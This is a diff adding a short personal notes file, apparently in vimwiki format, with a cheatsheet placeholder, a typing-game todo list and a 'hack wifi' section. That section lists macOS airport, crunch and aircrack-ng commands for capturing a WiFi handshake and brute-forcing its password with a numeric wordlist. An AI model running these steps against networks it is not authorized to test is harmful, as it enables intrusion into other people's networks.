@@ -1,0 +1,14 @@
+= cheatsheets =
+	[[-]][[ link here]]
+
+= typing game =
+1) countdown mode async (clock_win and input window)
+2) stats graph (save in stats.txt)
+
+= hack wifi =
+1) ~~airport -s~~ (check all wifi)
+2) save data of the wifi that you want to crack
+3) ~~sudo airport -z~~ disconnect all wifi
+4) ~~sudo airport en0 sniff [channel]~~
+5) ~~crunch 8 8 0123456789 -o dic.txt~~
+6) ~~aircrack-ng -w [dictionary file] -b $BSSID /tmp/*.cap~~
